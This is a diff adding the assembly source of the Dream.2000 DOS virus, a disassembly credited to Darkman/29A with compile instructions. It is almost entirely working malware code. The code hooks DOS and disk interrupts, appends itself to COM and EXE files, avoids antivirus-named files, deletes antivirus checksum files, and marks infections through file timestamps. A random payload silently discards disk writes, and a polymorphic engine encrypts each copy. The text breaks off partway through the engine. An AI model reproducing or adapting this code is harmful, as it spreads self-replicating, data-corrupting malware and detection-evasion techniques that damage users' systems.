@@ -1,0 +1,1255 @@
+comment *
+                               Dream.2000              млллллм млллллм млллллм
+                             Disassembly by            ллл ллл ллл ллл ллл ллл
+                              Darkman/29A               мммллп плллллл ллллллл
+                                                       лллмммм ммммллл ллл ллл
+                                                       ллллллл ллллллп ллл ллл
+
+  Dream.2000 is a 2000 bytes resident appending COM and EXE virus. Infects
+  files at find next matching file (FCB). Dream.2000 has an error handler,
+  retro structures, a destructive payload and is polymorphic in file using its
+  internal polymorphic engine.
+
+  To compile Dream.2000 with Turbo Assembler v 5.0 type:
+    TASM /M DREAMMAN.ASM
+    TLINK /t /x DREAMMAN.OBJ
+
+*
+
+.model tiny
+.code
+ org   100h                              ; Origin of Dream.2000
+
+stack_       equ     $-01h               ; Stack
+code_begin:
+crypt_begin:
+             call    delta_offset
+delta_offset:
+             pop     si                  ; Load SI from stack
+             sub     si,(delta_offset-code_begin)
+
+             mov     bp,ds               ; BP = segment of PSP for current ...
+
+             push    cs                  ; Save CS at stack
+             pop     ds                  ; Load DS from stack (CS)
+
+             jmp     allocate_mem
+virus_exit:
+             cmp     [si+executa_stat-100h],'Z'
+             je      vir_com_exit        ; COM executable? Jump to vir_com_...
+             cmp     [si+executa_stat-100h],'M'
+             je      vir_exe_exit        ; EXE executable? Jump to vir_exe_...
+eternal_loop:
+             jmp     eternal_loop
+vir_com_exit:
+             lea     ax,origin_code      ; AX = offset of origin_code
+             add     ax,si               ; Add delta offset to offset of or...
+             sub     ax,100h             ; Subtract offset of beginning of ...
+
+             xchg    ax,si               ; SI = offset of origin_code
+             mov     di,100h             ; DI = offset of beginning of code
+             mov     cx,03h              ; Move three bytes
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+             rep     movsb               ; Move the original code to beginning
+
+             push    cs                  ; Save CS at stack
+
+             mov     ax,100h             ; AX = offset of beginning of code
+             push    ax                  ; Save AX at stack
+
+             retf                        ; Return far
+vir_exe_exit:
+             mov     ds,bp               ; DS = segment of PSP for current ...
+
+             push    ds                  ; Save DS at stack
+             pop     es                  ; Load ES from stack (DS)
+
+             mov     dx,ds               ; DX = segment of PSP for current ...
+             add     dx,10h              ; DX = segment of beginning of code
+             mov     cx,dx               ; CX =    "    "      "     "   "
+             add     dx,cs:[si+initial_ss-100h]
+
+             cli                         ; Clear interrupt-enable flag
+             mov     ss,dx               ; SS = initial SS relative to star...
+             mov     sp,cs:[si+initial_sp-100h]
+             sti                         ; Set interrupt-enable flag
+
+             add     cx,cs:[si+initial_cs-100h]
+             push    cx                  ; Save CX at stack
+             mov     ax,cs:[si+initial_ip-100h]
+             push    ax                  ; Save AX at stack
+
+             retf                        ; Return far
+
+initial_cs   dw      ?                   ; Initial CS relative to start of ...
+initial_ip   dw      ?                   ; Initial IP
+initial_ss   dw      ?                   ; Initial SS relative to start of ...
+initial_sp   dw      ?                   ; Initial SP
+origin_code  db      11001101b,00100000b,?
+executa_stat db      'Z'                 ; Executable status
+
+prepare_name proc    near                ; Prepare filename
+             pushf                       ; Save flags at stack
+             call    int21_simula
+             popf                        ; Load flags from stack
+
+             push    ds es               ; Save segments at stack
+             push    cs                  ; Save CS at stack
+             pop     es                  ; Load ES from stack (CS)
+
+             mov     ax,word ptr [dta_addr]
+             mov     si,word ptr [dta_addr+02h]
+
+             mov     ds,ax               ; DS = segment of Disk Transfer Ar...
+             lea     di,filename         ; DI = offset of filename
+             cld                         ; Clear direction flag
+             lodsb                       ; AL = byte of File Control Block ...
+             cmp     al,0ffh             ; Extended File Control Block (XFCB)?
+             jne     not_extended        ; Not zero? Jump to not_extended
+
+             add     si,06h              ; BX = offset of File Control Bloc...
+             lodsb                       ; AL = drive number
+not_extended:
+             push    si                  ; Save SI at stack
+             cmp     al,00h              ; Default drive?
+             je      default_driv        ; Equal? Jump to default_driv
+
+             add     al,40h              ; Convert to character
+             stosb                       ; Store drive character
+             mov     al,':'              ; Colon
+             stosb                       ; Store colon
+default_driv:
+             mov     cx,08h              ; Examine eight bytes
+store_name:
+             lodsb                       ; AL = one byte of filename
+             cmp     al,' '              ; End of filename?
+             je      store_dot           ; Equal? Jump to store_dot
+
+             stosb                       ; Store one byte of filename
+
+             loop    store_name
+store_dot:
+             mov     al,'.'              ; Dot
+             stosb                       ; Store dot
+
+             add     si,cx               ; SI = offset of file extension
+             cmp     cx,00h              ; Eight characters long filename?
+             je      sto_file_ext        ; Equal? Jump to sto_file_ext
+
+             dec     si                  ; SI = offset of file extension
+sto_file_ext:
+             lodsw                       ; AX = two bytes of file extension
+             stosw                       ; Store two bytes of file extension
+
+             lodsb                       ; AL = one byte of file extension
+             stosb                       ; Store one byte of file extension
+
+             mov     al,00h              ; Zero AL
+             stosb                       ; Store zero
+             pop     si                  ; Load SI from stack
+
+             mov     ax,[si+16h]         ; AX = file time
+             pop     es ds               ; Load segments from stack
+
+             mov     cs:[file_time],ax   ; Store file time
+
+             ret                         ; Return
+set_dta_addr:
+             push    ax                  ; Save AX at stack
+             mov     ax,ds               ; AX = segment of Disk Transfer Ar...
+             mov     word ptr cs:[dta_addr],ax
+             mov     word ptr cs:[dta_addr+02h],dx
+             pop     ax                  ; Load AX from stack
+
+             jmp     int21_exit_
+             endp
+
+filename     db      0fh dup(?)          ; Filename
+file_time    dw      ?                   ; File time
+table_begin:
+name_table   db      'SC'                ; McAfee ViruScan
+             db      'CL'                ;   "       "
+             db      'F-'                ; F-PROT
+             db      'VI'                ; VIRSTOP
+             db      'MS'                ; Microsoft Anti-Virus
+             db      'VS'                ; Vsafe
+             db      'WI'                ; Windows
+table_end:
+dta_addr     dd      ?                   ; Disk Transfer Area (DTA) address
+fil_ext_stat db      ?                   ; File extension status
+
+tst_file_ext proc    near                ; Test file extension
+             cld                         ; Clear direction flag
+             clc                         ; Clear carry flag
+
+             mov     ax,[file_time]      ; AX = file time
+             db      10000011b,11100000b ; AND AX,1Fh (opcode 83h,0e0h,1fh)
+             db      00011111b           ; AX = seconds
+             db      10000011b,11111000b ; CMP AX,1Eh (opcode 83h,0f80h,1eh)
+             db      00011110b           ; Already infected (60 seconds)?
+             je      tst_fil_exit        ; Equal? Jump to tst_fil_exit
+
+             lea     di,filename         ; DI = offset of filename
+             mov     al,'.'              ; Dot
+             mov     cx,0fh              ; Search through fifteen bytes
+             repne   scasb               ; Find the dot in the filename
+
+             cmp     [di],'XE'           ; EXE executable?
+             jne     test_com            ; Not equal? Jump to test_com
+             cmp     byte ptr [di+02h],'E'
+             jne     test_com            ; Not equal? Jump to test_com
+
+             mov     [fil_ext_stat],'M'  ; EXE executable
+
+             clc                         ; Clear carry flag
+
+             ret                         ; Return
+test_com:
+             cmp     [di],'OC'           ; COM executable?
+             jne     test_ms             ; Not equal? Jump to test_ms
+             cmp     byte ptr [di+02h],'M'
+             jne     test_ms             ; Not equal? Jump to test_ms
+
+             mov     [fil_ext_stat],'Z'  ; COM executable
+
+             clc                         ; Clear carry flag
+
+             ret                         ; Return
+test_ms:
+             cmp     [di],'SM'           ; Microsoft Anti-Virus checksum file?
+             jne     test_cp             ; Not equal? Jump to test_cp
+
+             mov     [fil_ext_stat],0ffh ; Checksum file
+
+             ret                         ; Return
+test_cp:
+             cmp     [si],'PC'           ; Central Point Anti-Virus checks...?
+             jne     tst_fil_exit        ; Not equal? Jump to tst_fil_exit
+
+             mov     [fil_ext_stat],0ffh ; Checksum file
+
+             ret                         ; Return
+tst_fil_exit:
+             stc                         ; Set carry flag
+
+             ret                         ; Return
+             endp
+
+exam_fil_ext proc    near                ; Examin file extension
+             cld                         ; Clear direction flag
+             lea     si,filename         ; SI = offset of filename
+             cmp     byte ptr [si+01h],':'
+             jne     not_default         ; Default drive? Jump to not_default
+
+             add     si,02h              ; SI = offset of filename
+not_default:
+             lodsw                       ; AX = two bytes of filename
+
+             lea     di,name_table       ; DI = offset of name_table
+             mov     cx,(table_end-table_begin)/02h
+             repne   scasw               ; Found filename?
+             jne     not_found           ; Not equal? Jump to not_found
+
+             stc                         ; Set carry flag
+
+             ret                         ; Return
+not_found:
+             clc                         ; Clear carry flag
+
+             ret                         ; Return
+             endp
+
+int21_simula proc    near                ; Simulate interrupt 21h
+             pushf                       ; Save flags at stack
+             call    cs:[int21_addr]
+
+             ret                         ; Return
+             endp
+find_first:
+             mov     cs:[infect_count],00h
+
+             jmp     int21_exit_
+find_next:
+             cmp     cs:[infect_count],02h
+             jbe     infect_file         ; Below or equal? Jump to infect_file
+
+             jmp     int21_exit_
+
+int21_virus  proc    near                ; Interrupt 21h of Dream.2000
+             cmp     ax,6323h            ; Dream.2000 function?
+             je      dream_functi        ; Equal? Jump to dream_functi
+
+             cmp     ah,11h              ; Find first matching file (FCB)?
+             je      find_first          ; Equal? Jump to find_first
+             cmp     ah,12h              ; Find next matching file (FCB)?
+             je      find_next           ; Equal? Jump to find_next
+
+             cmp     ah,1ah              ; Set Disk Transfer Area address?
+             jne     int21_exit          ; Not equal? Jump to int21_exit
+
+             jmp     set_dta_addr
+int21_exit:
+             jmp     int21_exit_
+             endp
+infect_file:
+             cli                         ; Clear interrupt-enable flag
+             mov     cs:[stack_seg],ss   ; Store stack segment
+             mov     cs:[stack_ptr],sp   ; Store stack pointer
+
+             push    cs                  ; Save CS at stack
+             pop     ss                  ; Load SS from stack (CS)
+             lea     sp,stack_           ; SP = offset of stack_
+             sti                         ; Set interrupt-enable flag
+
+             push    ax bx cx dx bp si di ds es
+             push    cs cs               ; Save segments at stack
+             pop     ds es               ; Load segments from stack
+
+             call    prepare_name
+             call    int24_store
+
+             call    tst_file_ext
+             jc      infect_exit         ; Already infected? Jump to infect_exit
+             call    exam_fil_ext
+             jc      infect_exit         ; Filename found? Jump to infect_exit
+             call    get_rnd_bit
+             jc      infect_exit         ; Don't infect? Jump to infect_exit
+
+             mov     [payload_stat],11h  ; Don't activate payload
+             call    infect_file_
+
+             mov     [payload_stat],00h  ; Activate payload
+             inc     [infect_count]      ; Increase infection counter
+infect_exit:
+             call    int24_load
+             pop     es ds di si bp dx cx bx ax
+
+             cli                         ; Clear interrupt-enable flag
+             push    cs:[stack_seg]      ; Save stack segment at stack
+             pop     ss                  ; Load SS from stack (stack segment)
+
+             mov     sp,cs:[stack_ptr]   ; SP = stack pointer
+             sti                         ; Set interrupt-enable flag
+int21_exit_:
+             jmp     cs:[int21_addr]
+
+             iret                        ; Interrupt return
+dream_functi:
+             mov     dx,8323h            ; Already resident
+
+             iret                        ; Interrupt return
+
+get_rnd_bit  proc    near                ; Get a random bit
+             call    get_rnd_num
+             and     ah,00000001b        ; AL = random number within one
+             cmp     ah,00000001b        ; Don't infect?
+             je      dont_infect         ; Equal? Jump to dont_infect
+
+             clc                         ; Clear carry flag
+
+             ret                         ; Return
+dont_infect:
+             stc                         ; Set carry flag
+
+             ret                         ; Return
+             endp
+
+infect_file_ proc    near                ; Infect COM or EXE file
+             call    init_rnd_num
+             mov     [file_padding],00h  ; Zero length of file padding
+
+             cmp     [fil_ext_stat],'M'  ; EXE executable?
+             je      infect_exe          ; Equal? Jump to infect_exe
+             cmp     [fil_ext_stat],'Z'  ; COM executable?
+             je      infect_com          ; Equal? Jump to infect_com
+             cmp     [fil_ext_stat],0ffh ; Checksum file?
+             je      delete_file         ; Equal? Jump to delete_file
+
+             ret                         ; Return
+infect_exe:
+             call    open_file
+             call    read_exe
+             call    prepare_exe
+
+             mov     al,00h              ; Set current file position (SOF)
+             call    set_file_pos
+
+             call    write_exe
+
+             mov     al,02h              ; Set current file position (EOF)
+             call    set_file_pos
+
+             mov     [executa_stat],'M'  ; EXE executable
+             call    write_virus
+
+             call    close_file
+
+             ret                         ; Return
+infect_com:
+             call    open_file
+             call    read_com
+             call    prepare_com
+
+             mov     al,00h              ; Set current file position (SOF)
+             call    set_file_pos
+
+             call    write_com
+
+             mov     al,02h              ; Set current file position (EOF)
+             call    set_file_pos
+
+             mov     [executa_stat],'Z'  ; COM executable
+             call    write_virus
+
+             call    close_file
+
+             ret                         ; Return
+delete_file:
+             mov     ah,41h              ; Delete file
+             lea     dx,filename         ; DX = offset of filename
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+open_file    proc    near                ; Open file
+             mov     ax,3d00h            ; Open file (read)
+             lea     dx,filename         ; DX = offset of filename
+             call    int21_simula
+             jc      open_exit           ; Error? Jump to open_exit
+             nop
+             mov     [file_handle],ax    ; Store file handle
+
+             mov     bx,[file_handle]    ; BX = file handle
+             mov     ax,1220h            ; Get system file table number
+             nop
+             int     2fh
+
+             push    ax                  ; Save AX at stack
+             pop     ax                  ; Load AX from stack
+
+             mov     bl,es:[di]          ; BL = system file table entry
+             nop
+             mov     ax,1216h            ; Get address of system FCB
+             nop
+             int     2fh
+             nop
+
+             mov     word ptr es:[di+02h],02h
+             nop
+             mov     byte ptr es:[di+04h],00100000b
+
+             push    es:[di+11h]         ; Save low-order word of filesize ...
+             pop     word ptr [filesize] ; Load low-order word of filesize ...
+             push    es:[di+13h]         ; Save high-order word of filesize...
+             pop     word ptr [filesize+02h]
+
+             push    es:[di+0dh]         ; Save file time at stack
+             pop     [file_time_]        ; Load file time from stack
+             push    es:[di+0fh]         ; Save file date at stack
+             pop     [file_date]         ; Load file date from stack
+
+             clc                         ; Clear carry flag
+
+             ret                         ; Return
+open_exit:
+             stc                         ; Set carry flag
+
+             ret                         ; Return
+             endp
+
+close_file   proc    near                ; Close file
+             call    set_file_inf
+
+             mov     ah,3eh              ; Close file
+             mov     bx,[file_handle]    ; BX = file handle
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+set_file_inf proc    near                ; Set file's date and time
+             mov     ax,5701h            ; Set file's date and time
+             mov     dx,[file_date]      ; DX = file date
+             mov     cx,[file_time_]     ; CX = file time
+             mov     bx,[file_handle]    ; BX = file handle
+             or      cl,00011111b        ; Set infection mark (60 seconds)
+             and     cl,11111110b        ;  "      "      "     "    "
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+set_file_pos proc    near                ; Set current file position
+             mov     ah,42h              ; Set current file position
+             sub     cx,cx               ; Zero CX
+             and     dx,00h              ; Zero DX
+             mov     bx,[file_handle]    ; BX = file handle
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+write_virus  proc    near                ; Write virus to COM or EXE file
+             mov     ah,40h              ; Write to file
+             mov     cx,[file_padding]   ; CX = number of bytes to write
+             sub     dx,dx               ; Zero DX
+             mov     bx,[file_handle]    ; BX = file handle
+             call    int21_simula
+
+             call    get_rnd_num
+             mov     [crypt_key],ax      ; Store encryption/decryption key
+             call    get_rnd_num
+             mov     [imm16_],ax         ; Store 16-bit immediate
+
+             lea     di,buffer           ; DI = offset of buffer
+             push    di                  ; Save DI at stack
+             push    di                  ; Save DI at stack
+             push    di                  ; Save DI at stack
+             pop     si                  ; Load SI from stack (DI)
+             call    dream_poly
+             sub     di,si               ; Subtract end of decryptor from b...
+             mov     [decrypt_len],di    ; Store length of decryptor
+             pop     di                  ; Load DI from stack
+
+             mov     si,di               ; DI = offset of buffer
+             mov     cx,50h              ; Search through eighty bytes
+             mov     al,0fh              ; Find the 16-bit immediate within...
+             repne   scasb               ;  "    "    "        "         "
+             dec     di                  ; DI = offset of 16-bit immediate
+
+             cmp     [fil_ext_stat],'Z'  ; COM executable?
+             je      calc_com_i16        ; Equal? Jump to calc_com_i16
+
+             mov     ax,100h             ; AX = offset of beginning of code
+             add     ax,[decrypt_len]    ; Add length of decryptor to begin...
+
+             jmp     store_imm16
+calc_com_i16:
+             mov     ax,word ptr [filesize]
+             add     ax,100h             ; Add offset of beginning of code ...
+             add     ax,[decrypt_len]    ; Add length of decryptor to 16-bi...
+store_imm16:
+             sub     ax,[imm16_]         ; AX = 16-bit immediate
+             stosw                       ; Store 16-bit immediate
+
+             pop     dx                  ; Load DX from stack (DI)
+             mov     ah,40h              ; Write to file
+             mov     cx,[decrypt_len]    ; CX = length of decryptor
+             mov     bx,[file_handle]    ; BX = file handle
+             call    int21_simula
+
+             lea     di,buffer           ; DI = offset of buffer
+             push    di                  ; Save DI at stack
+             lea     si,crypt_begin      ; SI = offset of crypt_begin
+             mov     cx,(crypt_end-crypt_begin)/02h
+encrypt_loop:
+             lodsw                       ; AX = two bytes of plain code
+             xor     ax,[crypt_key]      ; Encrypt two bytes of plain code
+             stosw                       ; Store two bytes of encrypted code
+
+             loop    encrypt_loop
+
+             mov     ah,40h              ; Write to file
+             mov     cx,(code_end-code_begin)
+             pop     dx                  ; Load DX from stack (DI)
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+read_com     proc    near                ; Read three bytes of the COM file
+             mov     ah,3fh              ; Read from file
+             mov     cx,03h              ; Read three bytes
+             lea     dx,origin_code      ; DX = offset of origin_code
+             mov     bx,[file_handle]    ; BX = file handle
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+read_exe     proc    near                ; Read twenty-eight bytes of the E...
+             mov     ah,3fh              ; Read from file
+             mov     bx,[file_handle]    ; BX = file handle
+             mov     cx,1ch              ; Read twenty-eight bytes
+             lea     dx,exe_header       ; DX = offset of exe_header
+             call    int21_simula
+
+             push    word ptr [exe_header+0eh]
+             pop     [initial_ss]        ; Load initial_ss from stack (ini...)
+             push    word ptr [exe_header+10h]
+             pop     [initial_sp]        ; Load initial_sp from stack (ini...)
+             push    word ptr [exe_header+14h]
+             pop     [initial_ip]        ; Load initial_ip from stack (ini...)
+             push    word ptr [exe_header+16h]
+             pop     [initial_cs]        ; Load initial_cs from stack (ini...)
+
+             ret                         ; Return
+             endp
+
+prepare_exe  proc    near                ; Prepare infection of the EXE file
+             mov     ax,word ptr [filesize]
+             mov     dx,word ptr [filesize+02h]
+             mov     [file_padding],00h  ; Zero length of file padding
+
+             mov     cx,10h              ; Divide by paragraphs
+             div     cx                  ; AX:DX = filesize in paragraphs
+             cmp     dx,00h              ; No file padding?
+             je      no_padding          ; Equal? Jump to no_padding
+
+             mov     ax,10h              ; AX = length of file padding
+             sub     ax,dx               ; Subtact low-order word of filesi...
+             add     word ptr [filesize],ax
+             mov     [file_padding],ax   ; Store length of file padding
+no_padding:
+             mov     ax,word ptr [filesize]
+             mov     dx,word ptr [filesize+02h]
+
+             mov     cx,10h              ; Divide by paragraphs
+             div     cx                  ; AX:DX = filesize in paragraphs
+
+             db      10000011b,11101000b ; SUB AX,10h (opcode 83h,0e8h,10h)
+             db      00010000b           ; Subtract one paragraph from file...
+             sub     ax,word ptr [exe_header+08h]
+
+             mov     word ptr [exe_header+14h],100h
+             mov     word ptr [exe_header+10h],2000h
+             mov     word ptr [exe_header+0ch],0ffffh
+
+             mov     word ptr [exe_header+16h],ax
+             mov     word ptr [exe_header+0eh],ax
+
+             mov     ax,word ptr [filesize]
+             mov     dx,word ptr [filesize+02h]
+             add     ax,(code_end-code_begin)
+             adc     dx,00h              ; DX:AX = filesize
+
+             mov     bx,200h             ; Divide by pages
+             div     bx                  ; AX:DX = filesize by pages
+
+             inc     ax                  ; Increase total number of 512-byt...
+             mov     word ptr [exe_header+02h],dx
+             mov     word ptr [exe_header+04h],ax
+
+             ret                         ; Return
+             endp
+
+write_exe    proc    near                ; Write twenty-eight bytes to the ...
+             mov     ah,40h              ; Write to file
+             mov     bx,[file_handle]    ; BX = file handle
+             mov     cx,1ch              ; Write twenty-eight bytes
+             lea     dx,exe_header       ; DX = offset of exe_header
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+prepare_com  proc    near                ; Prepare infection of the COM file
+             mov     ax,word ptr [filesize]
+             db      10000011b,11101000b ; SUB AX,03h (opcode 83h,0e8h,03h)
+             db      00000011b           ; AX = offset of virus within infe...
+             mov     [virus_offset],ax   ; Store offset of virus within inf...
+
+             ret                         ; Return
+             endp
+
+write_com    proc    near                ; Write three bytes to the COM file
+             mov     ah,40h              ; Write to file
+             mov     bx,[file_handle]    ; BX = file handle
+             mov     cx,03h              ; Write three bytes
+             lea     dx,infect_code      ; DX = offset of infect_code
+             call    int21_simula
+
+             ret                         ; Return
+             endp
+
+int24_virus  proc    near                ; Interrupt 24h of Dream.2000
+             mov     al,03h              ; AL = fail system call in progress
+
+             iret                        ; Interrupt return!
+             endp
+
+int24_store  proc    near                ; Get and set interrupt vector 24h
+             push    es                  ; Save ES at stack
+             sub     ax,ax               ; Zero AX
+             mov     es,ax               ; ES = segment of interrupt table
+
+             push    es:[24h*04h]        ; Save address of interrupt 24h fr...
+             push    es:[24h*04h+02h]    ;  "      "    "      "      "    "
+             pop     word ptr [int24_addr+02h]
+             pop     word ptr [int24_addr]
+
+             mov     es:[24h*04h],offset int24_virus
+             mov     es:[24h*04h+02h],cs ; Set interrupt vector 24h
+             pop     es                  ; Load ES from stack
+
+             ret                         ; Return
+             endp
+
+int24_load   proc    near                ; Set interrupt vector 24h
+             push    es                  ; Save ES at stack
+             db      10000011b,11100000b ; AND AX,00h (opcode 83h,0e0h,00h)
+             db      00000000b           ; Zero AX
+             mov     es,ax               ; ES = segment of interrupt table
+
+             push    word ptr [int24_addr+02h]
+             push    word ptr [int24_addr]
+             pop     es:[24h*04h]        ; Load address of interrupt 24h fr...
+             pop     es:[24h*04h+02h]    ;  "      "    "      "      "    "
+             pop     es                  ; Load ES from stack
+
+             ret                         ; Return
+             endp
+
+get_rnd_num  proc    near                ; Get 16-bit random number
+             push    dx                  ; Save DX at stack
+             mov     ax,cs:[random_num_] ; AX = 16-bit random number
+             imul    word ptr cs:[random_num]
+             add     ax,word ptr cs:[random_num+02h]
+             mov     cs:[random_num_],ax ; Store 16-bit random number
+
+             ror     al,01h              ; Rotate low-order byte of random ...
+             rol     ah,01h              ; Rotate high-order byte of random...
+             pop     dx                  ; Load DX from stack
+
+             ret                         ; Return
+             endp
+
+init_rnd_num proc    near                ; Initialize 16-bit random number
+             mov     ah,2ch              ; Get system time
+             int     21h
+             mov     [random_num_],dx    ; Store 16-bit random number
+
+             ret                         ; Return
+             endp
+
+int13_virus  proc    near                ; Interrupt 21h of Dream.2000
+             cmp     cs:[payload_stat],11h
+             je      int13_exit          ; Don't activate payload? Jump to ...
+
+             cmp     ah,03h              ; Write disk sector(s)?
+             je      payload             ; Equal? Jump to payload
+int13_exit:
+             jmp     cs:[int13_addr]
+
+             iret                        ; Interrupt return
+payload:
+             push    ax bx               ; Save registers at stack
+             call    get_rnd_num
+             and     ah,00000111b        ; AH = random number within seven
+             and     al,00000111b        ; AL = random number within seven
+             cmp     ah,00000111b        ; Activate payload?
+             jne     no_payload          ; Not equal? Jump to no_payload
+             cmp     al,00000110b        ; Activate payload?
+             jne     no_payload          ; Not equal? Jump to no_payload
+             pop     bx ax               ; Load registers from stack
+
+             clc                         ; Clear carry flag
+
+             iret                        ; Interrupt return
+no_payload:
+             pop     bx ax               ; Load registers from stack
+
+             jmp     int13_exit
+             endp
+
+             db      '[ Dream Man / Doctor Revenge ] 12-02-94 Italy'
+allocate_mem:
+             mov     ax,6323h            ; Dream.2000 function
+             int     21h
+             cmp     dx,8323h            ; Already resident?
+             je      virus_exit_         ; Equal? Jump to virus_exit_
+
+             mov     ah,30h              ; Get DOS version
+             int     21h
+             cmp     al,04h              ; DOS v 4.xx?
+             jb      virus_exit_         ; Below? Jump to virus_exit_
+
+             mov     ax,3521h            ; Get interrupt vector 21h
+             int     21h
+             mov     word ptr [si+int21_addr-100h],bx
+             mov     word ptr [si+int21_addr+02h-100h],es
+
+             mov     al,13h              ; Get interrupt vector 13h
+             int     21h
+             mov     word ptr [si+int13_addr-100h],bx
+             mov     word ptr [si+int13_addr+02h-100h],es
+
+             and     bx,00h              ; Zero BX
+
+             mov     ax,bp               ; AX = segment of PSP for current ...
+             dec     ax                  ; AX = segment of current Memory C...
+             mov     es,ax               ; ES =    "    "     "      "     "
+
+             cmp     byte ptr es:[bx],'Z'
+             jne     virus_exit_         ; Not last block in chain? Jump to...
+
+             mov     ax,(data_end-code_begin+0fh)/10h
+             mov     dx,es:[bx+03h]      ; BX = size of memory block in par...
+             sub     dx,ax               ; BX = new size of memory block in...
+             mov     es:[bx+03h],dx      ; Store new size of memory block i...
+             sub     es:[bx+12h],ax      ; Subtract length of virus in para...
+             mov     ax,es:[bx+12h]      ; AX = segment of virus at top of ...
+
+             push    ax                  ; Save AX at stack
+             pop     es                  ; Load ES from stack (AX)
+
+             mov     cx,(code_end-code_begin)
+             mov     di,100h             ; DI = offset of beginning of code
+             push    si                  ; Save SI at stack
+             rep     movsb               ; Move the virus to top of memory
+             pop     si                  ; Load SI from stack
+
+             push    ds                  ; Save DS at stack
+             mov     ax,es               ; AX = segment of virus at top of ...
+             mov     ds,ax               ; DS =    "    "    "   "   "  "   "
+             lea     dx,int21_virus      ; DX = offset of int21_virus
+             mov     ax,2521h            ; Set interrupt vector 21h
+             int     21h
+
+             mov     al,13h              ; Set interrupt vector 13h
+             lea     dx,int13_virus      ; DX = offset of int13_virus
+             int     21h
+             pop     ds                  ; Load DS from stack
+virus_exit_:
+             jmp     virus_exit
+
+comment *
+                    Dream.2000 (polymorphic engine)    млллллм млллллм млллллм
+                             Disassembly by            ллл ллл ллл ллл ллл ллл
+                              Darkman/29A               мммллп плллллл ллллллл
+                                                       лллмммм ммммллл ллл ллл
+                                                       ллллллл ллллллп ллл ллл
+
+                 Calling parameters:
+                   ES:DI  Pointer to decryptor + encrypted code
+
+                 Return parameters:
+                   None.
+
+  Garbage instructions:
+    NOP; CLC; STC; CMC; CLI; CLD; INC BP; DEC BP; CMP AL,imm8; CMP AX,imm16;
+    CMP AL,AL; CMP AX,AX; TEST AL,AL; TEST AX,AX; JA/JNBE imm8;
+    JAE/JNC/JNB imm8; JB/JC/JNAE imm8; JBE/JNA imm8; JE/JZ imm8; JG/JNLE imm8;
+    JGE/JNL imm8; JL/JNGE imm8; JLE/JNG imm8; JNE/JNZ imm8; JNO imm8;
+    JNP/JPO imm8; JNS imm8; JO imm8; JP/JPE imm8; JS imm8
+
+  Garbage registers:
+    AL; AH; BL; BH; CL; CH; DL; CH; AX; BX; CX; DX; BP; SP; DI; SI
+
+  Random registers:
+    DX; BP; DI; SI
+
+  Decryptor:
+    PUSH DS
+    Upto four garbage instructions
+    MOV reg16,imm16; (MOV reg16,imm16)
+    Upto four garbage instructions; (One garbage instruction).
+    XCHG AX,imm16; (PUSH reg16; Upto four garbage instructions; POP BX)
+    MOV reg16,imm16; (MOV reg16,imm16)
+    One garbage instruction; (Upto four garbage instructions).
+    PUSH reg16,imm16 (XCHG BX,imm16)
+    (Upto four garbage instructions).
+    (POP AX)
+    MOV reg16,imm16
+    Upto four garbage instructions; (One garbage instruction).
+    XCHG CX,imm16; (PUSH reg16; Upto four garbage instructions; POP CX)
+    Upto four garbage instructions
+    PUSH CS
+    POP DS
+    (Upto four garbage instructions).
+    XOR (CS:)[BX+imm16],AX
+    Upto four garbage instructions
+    INC BX; (ADD BX,02h)
+    Upto four garbage instructions
+    (INC BX)
+    LOOP imm8                               (Offset of XOR (CS:)[BX+imm16],AX)
+    POP DS
+
+  Minimum length of decryptor:                33 bytes.
+  Maximum length of decryptor:               204 bytes
+  Length of Dream.2000 (polymorphic engine): 501 bytes.
+*
+
+dream_poly   proc    near                ; Dream.2000 (polymorphic engine)
+             push    si                  ; Save SI at stack
+             push    cs cs               ; Save segments at stack
+             pop     es ds               ; Load segments from stack
+
+             mov     al,00011110b        ; PUSH DS (opcode 1eh)
+             stosb                       ; Store PUSH DS
+
+             mov     [xor_bx_i_off],00h  ; Zero offset of XOR [BX+imm16],AX
+
+             call    init_rnd_num
+             call    get_rnd_num
+
+             mov     [gen_idx_stat],00h  ; Zero generate MOV reg16,imm16 st...
+             mov     [gen_key_stat],00h  ; Zero generate MOV reg16,imm16 st...
+
+             db      10000011b,11100000b ; AND AX,03h (opcode 83h,0e0h,03h)
+             db      00000011b           ; AX = random number within three
+             mov     cx,ax               ; CX =   "      "      "      "
+             inc     cx                  ; CX =   "      "      "    four
+garbage_loop:
+             call    gen_garbage_
+
+             loop    garbage_loop
+
+             call    get_rnd_num
+             and     ah,00000001b        ; AH = random number within one
+             cmp     ah,00h              ; Generate MOV reg16,imm16 (regi...)?
+             je      gen_key_reg         ; Equal? Jump to gen_key_reg
+gen_idx_reg:
+             mov     [gen_idx_stat],0bh  ; Don't generate MOV reg16,imm16 ...?
+
+             mov     dh,03h              ; DH = index register (BX)
+             mov     ax,0f0fh            ; AX = 16-bit immediate
+             call    gen_mov_reg
+
+             cmp     [gen_key_stat],0bh  ; Generate MOV reg16,imm16 (regi...)?
+             jne     gen_key_reg         ; Not equal? Jump to gen_key_reg
+
+             jmp     gen_coun_reg
+gen_key_reg:
+             mov     [gen_key_stat],0bh  ; Don't generate MOV reg16,imm16 ...?
+
+             and     dh,00h              ; DH = register holding decryption...
+             mov     ax,[crypt_key]      ; AX = encryption/decryption key
+             call    gen_mov_reg
+
+             cmp     [gen_idx_stat],0bh  ; Generate MOV reg16,imm16 (inde...)?
+             jne     gen_idx_reg         ; Not equal? Jump to gen_idx_reg
+gen_coun_reg:
+             mov     ax,(code_end-code_begin)
+             mov     dh,01h              ; DH = count register (CX)
+             call    gen_mov_reg
+             call    gen_xor_bx_i
+             call    gen_inc_idx
+             call    gen_loop_i8
+
+             mov     al,00011111b        ; POP DS (opcode 1fh)
+             stosb                       ; Store POP DS
+             pop     si                  ; Load SI from stack
+
+             ret                         ; Return
+
+garbage_tbl  dw      gen_one_byte        ; Offset of gen_one_byte
+             dw      gen_cmp_acc         ; Offset of gen_cmp_acc
+             dw      gen_cmp_acc_        ; Offset of gen_cmp_acc_
+             dw      gen_test_acc        ; Offset of gen_test_acc
+one_byte_tbl:
+             nop
+             clc                         ; Clear carry flag
+             stc                         ; Set carry flag
+             cmc                         ; Complement Carry Flag
+             cli                         ; Clear interrupt-enable flag
